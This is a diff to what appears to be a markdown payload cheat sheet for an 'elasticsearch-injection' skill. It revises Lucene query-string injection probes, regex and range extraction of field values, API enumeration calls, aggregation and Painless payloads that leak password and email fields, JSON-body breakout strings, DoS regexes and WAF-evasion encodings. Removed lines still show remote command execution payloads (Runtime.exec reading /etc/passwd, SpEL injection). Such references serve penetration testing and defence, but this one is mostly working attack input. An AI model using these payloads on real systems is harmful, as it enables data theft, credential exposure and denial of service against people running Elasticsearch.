@@ -1,5 +1,5 @@
 ---
-description: Lucene query_string injection, field enumeration (`_exists_`, wildcard fields), regex-based data extraction, cross-index access, source filtering override, direct API enumeration
+description: Lucene query_string injection, field enumeration (`_exists_`, wildcard fields), regex and range extraction, filter negation, cross-index access, source filtering override, direct API enumeration, JSON-body breakout
 skill: elasticsearch-injection
 ---
 
@@ -12,11 +12,11 @@ Organized by attack phase: detection → field enumeration → data extraction �
 ### Confirm query_string Processing
 
 ```
-# Boolean logic — if processed, AND/OR change result set
-test AND 1=1
-test AND 1=2
+# Boolean logic — if processed, AND/OR/NOT change the result set.
+# `1=1` is not Lucene logic (the standard analyzer turns it into terms); use match-all instead.
+test AND *:*
+test AND NOT *:*
 test OR impossible_term_xyz
-* OR 1=1
 
 # Wildcard — returns more results than specific term
 *
@@ -58,52 +58,6 @@ field:[
 ---
 
 ## Field Enumeration Payloads
-
-### Common Sensitive Fields
-
-```
-# Authentication/credential fields
-password:*
-password_hash:*
-hashed_password:*
-secret:*
-api_key:*
-token:*
-access_token:*
-refresh_token:*
-session_token:*
-private_key:*
-
-# PII fields
-ssn:*
-social_security:*
-credit_card:*
-card_number:*
-bank_account:*
-phone:*
-address:*
-date_of_birth:*
-dob:*
-
-# Internal/admin fields
-admin_notes:*
-internal_notes:*
-staff_notes:*
-debug:*
-internal_id:*
-tenant_id:*
-deleted:*
-hidden:*
-private:*
-
-# Infrastructure fields
-host:*
-hostname:*
-ip_address:*
-server:*
-database:*
-connection_string:*
-```
 
 ### Field Existence Probes
 
@@ -153,17 +107,6 @@ fieldname:/^[n-z].*/
 fieldname:/^[a-g].*/
 fieldname:/^[h-m].*/
 
-# Numeric first character
-fieldname:/^[0-9].*/
-fieldname:/^[0-4].*/
-fieldname:/^[5-9].*/
-
-# Exact character probes
-fieldname:/^a.*/
-fieldname:/^b.*/
-...
-fieldname:/^z.*/
-
 # Multi-character extraction (build progressively)
 fieldname:/^se.*/
 fieldname:/^sec.*/
@@ -188,18 +131,6 @@ last_login:[2024-01-01 TO *]
 email:[a TO m]
 email:[n TO z]
 username:[admin TO admin~]
-```
-
-### Boolean Extraction via Count Differential
-
-```
-# If search returns hit count, use to extract boolean fields
-active:true            → N results
-active:false           → M results
-verified:true          → N results
-is_admin:true          → N results (should be small number)
-role:admin             → N results
-role:superadmin        → N results
 ```
 
 ---
@@ -278,12 +209,6 @@ GET /*/_mapping
 # Document search
 GET /_search?size=100
 POST /_search {"query":{"match_all":{}},"_source":["*"]}
-
-# Specific index
-GET /users/_search?size=1000
-GET /credentials/_search
-GET /secrets/_search
-GET /audit_log/_search
 ```
 
 ### Aggregation Extraction
@@ -291,14 +216,17 @@ GET /audit_log/_search
 ```json
 {"size": 0, "aggs": {"emails": {"terms": {"field": "email.keyword", "size": 10000}}}}
 {"size": 0, "aggs": {"roles": {"terms": {"field": "role.keyword", "size": 100}}}}
-{"size": 0, "aggs": {"password_lengths": {"stats": {"field": "password.length"}}}}
 ```
 
-### Script Execution (ES < 5.x or script.inline enabled)
+### Scripts
+
+Painless inline scripts are enabled by default but sandboxed: no `Runtime`, no file or process
+access. Groovy and other dynamic languages were disabled and later removed, so OS execution via
+scripts applies only to very old clusters. Painless is still useful to read field values the
+query cannot return:
 
 ```json
-{"query": {"bool": {"must": [{"script": {"script": {"source": "Runtime.getRuntime().exec('id')"}}}]}}}
-{"script_fields": {"output": {"script": {"source": "java.lang.Runtime.getRuntime().exec('cat /etc/passwd')"}}}}
+{"script_fields": {"leak": {"script": {"source": "doc['password.keyword'].value"}}}}
 ```
 
 ---
@@ -306,10 +234,9 @@ GET /audit_log/_search
 ## DoS Payloads (use sparingly, with authorization)
 
 ```
-# Expensive regex (catastrophic backtracking)
+# Expensive regex. Lucene regex is automaton-based, so there is no catastrophic backtracking;
+# oversized automata fail with a max_determinized_states error instead (itself a fingerprint).
 fieldname:/.*a{1000}.*/
-fieldname:/(a+)+$/
-fieldname:/([a-z]+)*!/
 
 # Wildcard prefix (forces index scan)
 fieldname:*test
@@ -322,42 +249,23 @@ a OR b OR c OR d OR e OR f OR g OR h OR i OR j OR k OR l OR m OR n OR o OR p
 
 ---
 
-## Framework-Specific Payloads
+## JSON Body Breakout
 
-### Spring Data Elasticsearch
+When input is interpolated into a JSON query body rather than a query-string parameter:
 
 ```
-# SpEL injection (if user input reaches Spring EL context)
-#{T(java.lang.Runtime).getRuntime().exec('id')}
+# App builds {"query": {"query_string": {"query": "USER_INPUT"}}}
+*", "fields": ["password"], "_source": ["password", "email"]},"dummy": {"match_all": {"query": "
+
+# App builds {"query": {"bool": {"must": [{"match": {"title": "USER_INPUT"}}]}}}
+test"}},{"match_all":{}}],"should":[{"match":{"password":"
 ```
 
-### Python elasticsearch-dsl
-
-```python
-# If raw_query parameter is exposed
-{"query_string": {"query": "* OR _exists_:password"}}
-```
-
-### Node.js @elastic/elasticsearch
-
-```json
-// If body is constructed from user input without sanitization
-{"query": {"query_string": {"query": "USER_INPUT", "default_field": "*"}}}
-// USER_INPUT = * OR _exists_:api_key
-```
-
----
+Input reaching an aggregation leaks whole value sets (`terms` on `password.keyword`, above).
 
 ## Detection Bypass / WAF Evasion
 
 ```
-# URL encoding of operators
-%2B (for +)
-%2D (for -)
-%7C (for |)
-%26%26 (for &&)
-%7C%7C (for ||)
-
 # Unicode variants
 \u002A (for *)
 \u003A (for :)
